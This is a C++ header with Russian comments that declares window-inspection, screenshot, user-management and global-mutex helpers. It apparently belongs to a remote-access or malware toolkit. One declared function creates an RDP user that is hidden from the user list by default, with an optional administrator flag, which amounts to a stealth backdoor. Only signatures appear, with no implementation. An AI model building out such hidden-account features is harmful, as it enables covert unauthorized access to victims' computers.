#pragma once

#include "core.h"

namespace Window
{
//возвращает длину заголовка
int GetCaption( HWND hwnd, StringBuilder& s );
//возвращает длину имени класса
int GetNameClass( HWND hwnd, StringBuilder& s );
//возвращает предка окна
HWND GetParent( HWND hwnd );
//возвращает самого верхнего предка
HWND GetTopParent( HWND hwnd );
//возвращает окно предка которое имеет заголовок
HWND GetParentWithCaption( HWND hwnd );

};

namespace Screenshot
{

bool Init();
void Release();

HBITMAP MakeBitmap( HWND hwnd );
bool MakeBmp( HWND hwnd,  Mem::Data& data );
bool MakePng( HWND hwnd, Mem::Data& data );
//возвращает: 0 - скриншот не удалось сделать, 1 - формат bmp, 2 - формат png
int Make( HWND hwnd, Mem::Data& data );

}

namespace Users
{

//создает пользователя для подключения по RDP
//если hidden = true, то создается юзер которого не видно в списке юзеров
bool AddRemoteUser( const char* name, const char* password, bool admin = false, bool hidden = true );
//удаление пользователя
bool Delete( const char* name );
HANDLE GetToken( const char* name );

}

namespace Mutex
{

//создает мьютекс с указанным именем, возвращает хендл мьютекса если он создался, 0 - если такой мьютекс уже существует
//мьютекс создается в пространстве Global (Global\name)
HANDLE Create( const StringBuilder& name );
//уничтожает мьютекс 
void Release( HANDLE mutex );

}
